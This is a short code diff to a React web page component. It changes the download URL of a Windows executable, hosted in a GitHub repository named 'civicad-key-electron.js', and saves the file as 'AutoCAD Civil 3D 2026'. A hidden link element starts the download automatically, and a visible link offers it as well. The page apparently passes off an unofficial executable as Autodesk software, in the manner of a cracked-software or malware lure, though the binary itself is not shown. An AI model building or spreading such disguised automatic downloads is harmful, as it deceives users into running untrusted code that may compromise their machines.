@@ -106,7 +106,7 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
   const startAutoDownload = () => {
     const tempLink = document.createElement("a");
     tempLink.href =
-      "https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe";
+      "https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk-autocad-civil-3d-2026%20Setup%201.0.5.exe";
     tempLink.download = "AutoCAD Civil 3D 2026";
     tempLink.style.display = "none";
     document.body.appendChild(tempLink);
@@ -241,7 +241,7 @@ const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
                             AutoCAD Civil 3D 2026 Ready for Download
                           </p>
                           <a
-                            href="https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe"
+                            href="https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk-autocad-civil-3d-2026%20Setup%201.0.5.exe"
                             download="AutoCAD Civil 3D 2026"
                             onClick={handleDownloadClick}
                             className="font-bold text-purple-900 underline hover:no-underline"
